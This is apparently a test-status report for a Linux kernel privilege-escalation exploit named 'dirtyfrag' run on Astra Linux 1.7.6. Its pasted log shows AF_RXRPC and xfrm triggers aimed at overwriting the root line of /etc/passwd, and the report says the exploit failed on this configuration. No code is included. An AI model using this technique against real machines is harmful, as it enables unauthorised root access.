✅ **Build & Test Environment:**
- **OS:** Astra Linux 1.7.6 (x86-64)
- **Kernel:** 6.1.90-1-generic
- **Libc:** glibc (dynamically linked)
- **Interpreter:** /lib64/ld-linux-x86-64.so.2
- **Architecture:** x86-64 (AMD64)
- **Kernel minimal version:** Linux 3.2.0 (as per ELF header)

⚠️ **Current status on Astra Linux 1.7.6:**
=== STAGE 2c: kernel trigger C @ off 8 (set chars 8-15 "0:GGGGGG:") ===
[+] plain UDP fake-server bound :7801
[+] AF_RXRPC client bound :7802
[+] client sendmsg 8 B → :7801 (handshake will follow asynchronously)
[*] /etc/passwd line 1 (root entry) AFTER:  'root:x:0:0:root:/root:/bin/bash$'
[!] post-trigger sanity check failed — char layout off
dirtyfrag: failed (rc=4)

- ESP method (xfrm): FAILED (module disabled/kernel hardening)
- RxRPC method: FAILED (post-trigger sanity check failed)
- **Result:** Exploit does NOT work on this configuration


